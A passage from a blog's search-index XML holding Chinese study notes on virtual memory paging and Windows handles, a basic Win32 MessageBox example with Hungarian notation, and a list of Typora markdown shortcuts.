偏移量：就是页（或者页帧）的大小，即这个页（或者页帧）到底能存多少数据。举个例子，有一个虚拟地址它的页号是4，偏移量是20，那么他的寻址过程是这样的：首先到页表中找到页号4对应的页帧号（比如为8），如果页不在内存中，则用失效机制调入页，否则把页帧号和偏移量传给MMU（CPU的内存管理单元）组成一个物理上真正存在的地址，接着就是访问物理内存中的数据了。总结起来说，虚拟内存地址的大小是与地址总线位数相关，物理内存地址的大小跟物理内存条的容量相关。 进一步优化，引入TLB（Translation lookaside buffer，页表寄存器缓冲）由上一节可知，页表是被存储在内存中的。我们知道CPU通过总线访问内存，肯定慢于直接访问寄存器的。为了进一步优化性能，现代CPU架构引入了TLB，用来缓存一部分经常访问的页表内容。 2.什么是句柄系统为每个进程在内存中分配一定的区域，用来存放各个句柄，即一个个32位无符号整型值（32位操作系统中）。每个32位无符号整型值相当于一个指针，指向内存中的另一个区域（我们不妨称之为区域A）。而区域A中存放的正是对象在内存中的地址。当对象在内存中的位置发生变化时，区域A的值被更新，变为当前时刻对象在内存中的地址，而在这个过程中，区域A的位置以及对应句柄的值是不发生变化的。这种机制，用一种形象的说法可以表述为：有一个固定的地址（句柄），指向一个固定的位置（区域A），而区域A中的值可以动态地变化，它时刻记录着当前时刻对象在内存中的地址。这样，无论对象的位置在内存中如何变化，只要我们掌握了句柄的值，就可以找到区域A，进而找到该对象。而句柄的值在程序本次运行期间是绝对不变的，我们（即系统）当然可以掌握它。这就是以不变应万变，按图索骥，顺藤摸瓜。 那么这里我们就要修正一下前面的说法了：通用句柄HANDLE有时候是逻辑指针，大多数时候是结构体指针，特殊句柄如HMENU等是结构体指针。这样第二个问题也解决了。 3.总结 所以，我们可以这样理解Windows句柄： 数值上，是一个32位无符号整型值（32位系统下）；逻辑上，相当于指针的指针；形象理解上，是Windows中各个对象的一个唯一的、固定不变的ID；作用上，Windows使用句柄来标识诸如窗口、位图、画笔等对象，并通过句柄找到这些对象。下面，关于句柄，再交代一些关键性细节： 1.所谓“唯一”、“不变”是指在程序的一次运行中。如果本次运行完，关闭程序，再次启动程序运行，那么这次运行中，同一对象的句柄的值和上次运行时比较，一般是不一样的。 其实这理解起来也很自然，所谓“一把归一把，这把是这把，那把是那把，两者不相干”（“把”是形象的说法，就像打牌一样，这里指程序的一次运行）。 2.句柄是对象生成时系统指定的，属性是只读的，程序员不能修改句柄。 3.不同的系统中，句柄的大小（字节数）是不同的，可以使用sizeof()来计算句柄的大小。 4.通过句柄，程序员只能调用系统提供的服务（即API调用），不能像使用指针那样，做其它的事。]]></content>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows编程]]></title>
    <url>%2F2019%2F07%2F28%2Fwindows%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[windows编程随笔 1.从MessageBox开始123456int MessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT wType ); 观察具体几个参数： hWnd： 为父窗口句柄，指定该对话框的所有者窗口。如果该参数为空(0/NULL)，则该对话框不属于任何窗口。 lpText: 显示在对话框中的消息。 lpCaption： 在对话框标题栏中显示的字符串表达式。如果该参数为空（vbNullString），则使用默认的“错误”作为对话框的标题。 wType： 指定显示按钮的数目及形式 那么问题出现了，句柄代表的到底是什么 简单的来说，句柄就是类似指针的标识 1.windows 之所以要设立句柄，根本上源于内存管理机制的问题—虚拟地址，简而言之数据的地址需要变动，变动以后就需要有人来记录管理变动，（就好像户籍管理一样），因此系统用句柄来记载数据地址的变更。 2.更透彻一点地认识句柄，句柄是一种指向指针的指针但是它的属性是只读的。 实例 那么一个完整的MessageBox便展现出来了 123456789101112131415161718192021222324#include&lt;windows.h&gt;int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE hprevinstance, PSTR szCmdLine, int iCmdShow) &#123; MessageBox(NULL, TEXT("this is content !"), TEXT("this is title !"), MB_OK); return 0;&#125;/*WinMain()函数的原型声明int WINAPI WinMain( HINSTANCE hInstance,//当前运行实例句柄 HINSTANCE hPrevInstance,//前一个实例句柄 LPSTR lpCmdLine,//指定命令参数行字符串 int nCmdShow;//指定窗口的显示状态)MessageBox函数声明int MessageBox( HWND hWnd,//所属窗口的句柄 LPCTSTR lpText,//消息字符串 LPCTSTR lpCaption,//消息框标题字符串 UNIT uType//消息框的类型);*/ 思考 在MB_OK处转到定义： 123456#define MB_OK 0x00000000L#define MB_OKCANCEL 0x00000001L#define MB_ABORTRETRYIGNORE 0x00000002L#define MB_YESNOCANCEL 0x00000003L#define MB_YESNO 0x00000004L#define MB_RETRYCANCEL 0x00000005L 对应关系 ：MB_OK 对应十六进制的0？ 用 1 来替换 MB_OK 一样可以得到结果吗？ bingo！ 1234MessageBox(NULL, TEXT("this is content !"), TEXT("this is title !"), 0); 编译通过！ 2.匈牙利命名法对于上面MessageBox函数中奇奇怪怪的参数，它们使用了匈牙利命名法。 这种标记法非常简单，即变量名以一个或者多个小写字母开始，这些字母表示变量的数据型态。例如：szCmdLine 中的 sz 代表“以0结尾的字符串（StringZero）”；在 hInstance 和 hPrevInstance 中的 h 前缀表示“句柄（Handle）”；在 iCmdShow 中的 i 前缀表示“整型（Integer）”。 当命名结构变量时，可以用结构名（或者结构名的一种缩写）的小写形式作为变量名称的前缀，或者用作整个变量名。例如：msg 变量是 MSG 型态的结构；wndclass 是 WNDCLASSEX 型态的一个结构；ps 是一个 PAINTSTRUCT 结构，rect 是一个 RECT 结构。 匈牙利表示法能够帮助程序写作者及早发现并避免程序中的错误。由于变量名既描述了变量的作用，又描述了其数据型态，就比较容易避免产生数据型态不合的错误。 前缀 数据类型 i int（整型） c char 或 WCHAR 或 TCHAR by BYTE （无符号字符） x, y int，表示 x 坐标和 y 坐标 l LONG（长整型） B 或 f BOOL（int）；f 表示“flag” w WORD（无符号短整型） dw DWORD（无符号长整型） fn 函数 s 字符串 sz 以零结束的字符串 h 句柄 p 指针 cx, cy int，表示 x 或 y 的长度，c 表示“count”（计数）]]></content>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[my first blog]]></title>
    <url>%2F2019%2F07%2F28%2Fmy-first-blog%2F</url>
    <content type="text"><![CDATA[第一个博客 第一个博客，简单记录一下markdown的快捷键吧 Typora快捷键 选中 选中一整行：ctrl+l选中单词：ctrl+d选中相同格式的文字：ctrl+e 跳转 跳转到文章开头：ctrl+home跳转到文章结尾：ctrl+end 搜索 搜索：ctrl+f替换：ctrl+h 输入格式 引用：输入&gt;之后输入空格代码块：ctrl+alt+f；```+语言标题：ctrl+数字表格：ctrl+t生成目录：[TOC]按回车插入标注：输入[]，后面+任何插入图片：直接拖动到指定位置即可或者ctrl+shift+i插入链接：ctrl+k插入表情：输入’:’之后输入英文单词无序列表：输入-之后输入空格有序列表：输入数字+“.”之后输入空格todolist：-[空格]空格 文字 显示格式 加粗：ctrl+b高亮：== 文字 ==着重：ctrl+shift+反引号键（tab键上面那个键）倾斜：ctrl+i下划线：ctrl+u]]></content>
  </entry>
</search>
